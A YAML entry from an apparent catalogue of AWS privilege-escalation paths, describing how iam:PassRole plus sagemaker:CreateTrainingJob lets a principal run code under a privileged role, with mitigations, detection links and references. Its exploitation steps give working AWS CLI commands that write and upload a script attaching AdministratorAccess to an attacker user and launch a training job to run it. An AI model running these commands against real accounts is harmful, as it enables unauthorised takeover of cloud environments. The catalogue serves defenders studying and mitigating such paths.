id: sagemaker-002
name: iam:PassRole + sagemaker:CreateTrainingJob
category: service-passrole
services:
- iam
- sagemaker
description: A principal with `iam:PassRole` and `sagemaker:CreateTrainingJob` can create a SageMaker training job with a
  privileged execution role. Training jobs can execute arbitrary container code and access AWS APIs with the permissions of
  the attached IAM role. By creating a training job with a malicious training script or container, the attacker can execute
  code with elevated privileges and exfiltrate credentials or modify AWS resources.
prerequisites:
  admin:
  - A role must exist that trusts sagemaker.amazonaws.com to assume it
  - The role must have administrative permissions (e.g., AdministratorAccess)
  - An S3 bucket must be accessible to store training data and output
  lateral:
  - A role must exist that trusts sagemaker.amazonaws.com to assume it
  - An S3 bucket must be accessible to store training data and output
exploitationSteps:
  awscli:
  - step: 1
    command: |
      echo '#!/bin/bash
      aws iam attach-user-policy --user-name attacker --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
      ' > exploit.sh && chmod +x exploit.sh
    description: Create a malicious training script that escalates privileges
  - step: 2
    command: |
      aws s3 cp exploit.sh s3://BUCKET_NAME/exploit/exploit.sh
    description: Upload the malicious script to S3
  - step: 3
    command: |
      aws sagemaker create-training-job \
        --training-job-name privesc-training \
        --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
        --algorithm-specification TrainingImage=IMAGE_URI,TrainingInputMode=File \
        --input-data-config '[{"ChannelName":"training","DataSource":{"S3DataSource":{"S3DataType":"S3Prefix","S3Uri":"s3://BUCKET_NAME/exploit/"}}}]' \
        --output-data-config S3OutputPath=s3://BUCKET_NAME/output \
        --resource-config InstanceType=ml.m5.large,InstanceCount=1,VolumeSizeInGB=10 \
        --stopping-condition MaxRuntimeInSeconds=1800
    description: Create a training job with the privileged role that executes the malicious script
  - step: 4
    command: aws sagemaker describe-training-job --training-job-name privesc-training
    description: Monitor the training job status and wait for execution
recommendation: |
  Restrict the `iam:PassRole` permission using the principle of least privilege.

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificSageMakerRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "sagemaker.amazonaws.com"
      }
    }
  }
  ```

  Additional controls:
  - Restrict `sagemaker:CreateTrainingJob` permissions
  - Monitor CloudTrail for SageMaker training job creation with privileged roles
  - Use VPC configuration to isolate training jobs
  - Restrict S3 access for training data sources
  - Alert on training jobs with administrative roles being created
  - Use container image signing and validation
discoveredBy:
  name: Spencer Gietzen
  organization: Rhino Security Labs
  date: '2019'
references:
- title: AWS Privilege Escalation Methods and Mitigation
  url: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- title: IAM Vulnerable - SageMaker PassRole
  url: https://github.com/BishopFox/iam-vulnerable
relatedPaths:
- sagemaker-001
- sagemaker-003
detectionTools:
  pmapper: https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/sagemaker_edges.py#L113-L121
learningEnvironments:
  iam-vulnerable:
    type: open-source
    githubLink: https://github.com/BishopFox/iam-vulnerable
    scenario: SageMaker-CreateTrainingJobPassRole
    description: "Deploy Terraform into your own AWS account and practice individual exploitation paths"
permissions:
  required:
  - permission: iam:PassRole
    resourceConstraints: Target role ARN must be in the Resource section
  - permission: sagemaker:CreateTrainingJob
    resourceConstraints: Must have permission to create SageMaker training jobs
  additional:
  - permission: iam:ListRoles
    resourceConstraints: Helpful for discovering available roles to pass
  - permission: iam:GetRole
    resourceConstraints: Useful for viewing role trust policies and attached permissions
attackVisualization:
  nodes:
  - id: start
    label: Starting Principal
    type: principal
    description: |
      The starting principal (user or role) with `iam:PassRole` and `sagemaker:CreateTrainingJob` permissions. This principal will create a SageMaker training job with a privileged role attached and execute malicious code to gain elevated privileges.
  - id: training_job
    label: New SageMaker Training Job
    type: resource
    description: |
      The newly created SageMaker training job with malicious training code. The job is created with `sagemaker:CreateTrainingJob` and configured to use a privileged IAM role via `iam:PassRole`. The training script or container is designed to escalate privileges by executing AWS API calls with the attached role's permissions.
  - id: target_role
    label: Existing Role That Trusts the sagemaker Service
    type: resource
    description: |
      The privileged IAM role that is passed to the SageMaker training job during creation. This role must trust sagemaker.amazonaws.com as a principal in its trust policy. When the training job executes, it runs with this role's permissions and can access AWS APIs accordingly.
  - id: exfiltrate
    label: Execute malicious training code
    type: action
    color: '#99ccff'
    description: |
      The training job executes with the target role's permissions. The malicious training script or container code can perform privileged API calls such as attaching admin policies to the attacker's principal, creating access keys, or modifying IAM permissions. The training job has full access to the AWS SDK with the role's credentials.
  - id: admin_outcome
    label: Effective Administrator
    type: outcome
    description: |
      If the target role has administrative permissions (AdministratorAccess or equivalent), the attacker gains full administrative access to the AWS account. The malicious training code can escalate the starting principal's permissions or create new admin-level access.
  - id: partial_outcome
    label: Check for Additional Access
    type: outcome
    color: '#ffeb99'
    description: |
      If the target role has some elevated permissions but not full admin, the attacker gains partial privilege escalation. This could include access to sensitive data (S3, RDS, DynamoDB), the ability to modify specific resources, or permissions that enable additional escalation paths.
  - id: minimal_outcome
    label: No Additional Access
    type: outcome
    color: '#cccccc'
    description: |
      If the target role only has minimal permissions or no interesting permissions, the privilege escalation may not provide meaningful additional access to the attacker. The training job would execute but without useful privileges.
  edges:
  - from: start
    to: training_job
    label: iam:PassRole + sagemaker:CreateTrainingJob
    description: |
      The attacker creates a new SageMaker training job and passes a privileged role to it. The training job is configured with a malicious training script (uploaded to S3) or a custom container image that will execute code to escalate privileges.

      Commands:
      ```bash
      # Create malicious training script
      echo '#!/bin/bash
      aws iam attach-user-policy --user-name attacker --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
      ' > exploit.sh && chmod +x exploit.sh

      # Upload to S3
      aws s3 cp exploit.sh s3://BUCKET_NAME/exploit/exploit.sh

      # Create training job with privileged role
      aws sagemaker create-training-job \
        --training-job-name privesc-training \
        --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
        --algorithm-specification TrainingImage=IMAGE_URI,TrainingInputMode=File \
        --input-data-config '[{"ChannelName":"training","DataSource":{"S3DataSource":{"S3DataType":"S3Prefix","S3Uri":"s3://BUCKET_NAME/exploit/"}}}]' \
        --output-data-config S3OutputPath=s3://BUCKET_NAME/output \
        --resource-config InstanceType=ml.m5.large,InstanceCount=1,VolumeSizeInGB=10 \
        --stopping-condition MaxRuntimeInSeconds=1800
      ```

      The training job will automatically start and execute the malicious code.
  - from: training_job
    to: target_role
    label: Training job assumes role
    description: |
      When the SageMaker training job starts, the SageMaker service automatically assumes the target role on behalf of the training job. The training script or container code then executes with all the permissions granted to this role, including full access to AWS APIs via the AWS SDK or CLI.
  - from: target_role
    to: exfiltrate
    label: Training job executes
    description: |
      The training job executes the malicious code with the target role's permissions. The code can perform any AWS API calls allowed by the role, such as escalating the attacker's privileges, exfiltrating data, or creating backdoors.

      Command to monitor:
      ```bash
      aws sagemaker describe-training-job --training-job-name privesc-training
      ```

      The training job runs automatically and executes the malicious script or container code with elevated privileges.
  - from: exfiltrate
    to: admin_outcome
    label: If role has admin permissions
    branch: A
    condition: admin
    description: |
      If the target role has AdministratorAccess or equivalent administrative permissions, the attacker gains full control over the AWS account. The malicious training code can attach admin policies to the attacker's principal, create new admin access keys, or perform any administrative action.
  - from: exfiltrate
    to: partial_outcome
    label: If role has some permissions
    branch: B
    condition: some_permissions
    description: |
      If the target role has elevated but non-administrative permissions, the attacker gains partial privilege escalation. This might include write access to S3 buckets, ability to modify specific resources, or permissions that enable additional privilege escalation techniques through other paths.
  - from: exfiltrate
    to: minimal_outcome
    label: If role has minimal permissions
    branch: C
    condition: no_permissions
    description: |
      If the target role only has minimal or non-sensitive permissions, the privilege escalation may not yield meaningful additional access. The training job would execute successfully but without useful privileges to escalate further.
